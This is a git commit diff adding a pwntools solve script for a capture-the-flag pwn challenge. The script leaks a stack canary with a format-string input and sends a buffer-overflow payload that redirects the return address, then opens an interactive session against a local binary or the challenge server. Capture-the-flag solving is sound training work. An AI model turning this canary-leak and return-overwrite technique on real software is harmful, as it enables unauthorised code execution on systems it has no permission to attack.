e224d841db652e3516266bd247b45b71b94361a0
leon332157 <leon332157@gmail.com>
2024-10-23 00:31:24 -0400

    add solve script and template

--- challenges/pwn/endurance-and-wormhole/solve.py
+++ challenges/pwn/endurance-and-wormhole/solve.py
@@ -1,10 +1,14 @@
 from pwn import *
 
-e = ELF("./wormhole")
-context.terminal = ["tmux","splitw","-h"]
-p = gdb.debug(e.path,gdbscript= '''
-              set emulate off''', env = {"flag":'MINUTEMAN{YOUWIN!}'}
-)
+if args.REMOTE:
+    host = "challs.umasscybersec.org"
+    port = 1337
+    p = remote(host, port)
+else:
+    e = ELF("./static/wormhole")
+    context.terminal = ["tmux","splitw","-h"]
+    p = process(e.path)
+
 print(p.recvuntil(b"?"))
 p.sendline(b"%7$p\n") # canary leak
 canary = int(p.recvuntil(b"C").strip()[:-1], 16)
@@ -13,9 +17,9 @@ p.clean()
 payload = b"A"*8 # buf
 payload += p64(canary) # canary
 payload += b"B"*8 # rbp
-payload += p64(e.symbols['wormhole']) # ret
+payload += p64(0x4011d2) # ret
 payload += b'\0'
-print(payload)
+
 p.sendline(payload)
 
 p.interactive()
